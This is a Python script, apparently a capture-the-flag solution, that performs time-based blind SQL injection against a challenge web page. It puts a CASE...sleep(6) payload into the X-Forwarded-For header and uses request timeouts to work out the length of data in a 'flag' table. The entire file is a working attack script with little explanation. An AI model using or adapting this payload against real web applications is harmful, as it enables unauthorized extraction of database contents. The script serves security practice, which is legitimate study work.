#!/usr/bin/env python
#-*- coding: utf-8 -*-
"""
@Author : darkN0te
@Create date : 2018-07-08
@description : 延时注入 计算长度
@Update date :   
"""  

import requests

url = 'http://ctf5.shiyanbar.com/web/wonderkun/index.php'
data_length = 0
i = 1
while True:
    header={
            "X-Forwarded-For":"1' and case when(length(substring((select group_concat(flag separator ';') from flag) from %s for 1))='') then sleep(6) else 0 end and 'a'='a" %i
            }
    try:
        r = requests.get(url, headers=header, timeout=6)
        print(" "+r.text)
        i += 1
    except:
        print("")
        print('the number of data is '+ str(i-1))
        print("")
        break